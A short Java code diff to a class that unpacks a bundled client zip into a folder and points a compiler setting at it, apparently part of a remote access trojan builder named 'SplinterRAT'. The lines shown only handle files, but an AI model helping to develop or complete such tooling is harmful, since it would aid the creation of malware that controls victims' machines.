@@ -37,7 +37,7 @@ public class CPPExtractor implements Runnable {
         InputStream stream;
         String finalFolderName = "/jcClient";
         String fileName = finalFolderName + ".zip";
-        Path folderOfTempFiles = Path.of(folderDestination, "SplinterRAT", "Server.Client Files");
+        Path folderOfTempFiles = Path.of(folderDestination, "SplinterRAT", "Client Files");
         if (!Files.exists(folderOfTempFiles)) {
             Files.createDirectories(folderOfTempFiles);
         }
@@ -57,7 +57,7 @@ public class CPPExtractor implements Runnable {
                         "Error extracting files", JOptionPane.ERROR_MESSAGE));
             }
             zipFile.extractAll(folderOfTempFiles.toString());
-            //java.lang.Compiler.localClientFiles = Path.of(folderOfTempFiles.toString());
+            Compiler.localClientFiles = Path.of(folderOfTempFiles.toString());
         } catch (Exception ex) {
             ex.printStackTrace();
         }
